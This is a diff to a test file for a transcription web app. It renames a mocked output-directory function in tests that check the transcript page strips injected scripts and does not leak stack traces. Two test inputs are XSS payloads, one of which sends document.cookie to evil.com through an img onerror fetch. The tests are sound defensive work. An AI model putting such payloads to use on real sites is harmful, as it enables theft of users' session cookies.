@@ -100,7 +100,7 @@ def test_transcript_detail_strips_script_tag(client: TestClient):
     md = "# Transcript\n\n<script>alert(document.cookie)</script>\n\nNormal content."
     out_dir, stem = _make_transcript_client(md)
 
-    with patch("wisper_transcribe.web.routes.transcripts._output_dir", return_value=out_dir):
+    with patch("wisper_transcribe.web.routes.transcripts.get_output_dir", return_value=out_dir):
         resp = client.get(f"/transcripts/{stem}")
 
     assert resp.status_code == 200
@@ -114,7 +114,7 @@ def test_transcript_detail_strips_event_handler(client: TestClient):
     md = 'Some audio <img src=x onerror="fetch(\'https://evil.com/\'+document.cookie)"> end.'
     out_dir, stem = _make_transcript_client(md)
 
-    with patch("wisper_transcribe.web.routes.transcripts._output_dir", return_value=out_dir):
+    with patch("wisper_transcribe.web.routes.transcripts.get_output_dir", return_value=out_dir):
         resp = client.get(f"/transcripts/{stem}")
 
     assert resp.status_code == 200
@@ -127,7 +127,7 @@ def test_transcript_detail_preserves_safe_content(client: TestClient):
     md = "**Alice**: Hello there.\n\n**Bob**: Hi Alice!"
     out_dir, stem = _make_transcript_client(md)
 
-    with patch("wisper_transcribe.web.routes.transcripts._output_dir", return_value=out_dir):
+    with patch("wisper_transcribe.web.routes.transcripts.get_output_dir", return_value=out_dir):
         resp = client.get(f"/transcripts/{stem}")
 
     assert resp.status_code == 200
@@ -198,7 +198,7 @@ def test_no_stack_trace_in_500_response():
     # than having the TestClient re-raise the exception in the test process.
     with TestClient(app, raise_server_exceptions=False) as client:
         with patch(
-            "wisper_transcribe.web.routes.transcripts._output_dir",
+            "wisper_transcribe.web.routes.transcripts.get_output_dir",
             side_effect=RuntimeError("secret internal path: /home/user/.config"),
         ):
             resp = client.get("/transcripts")
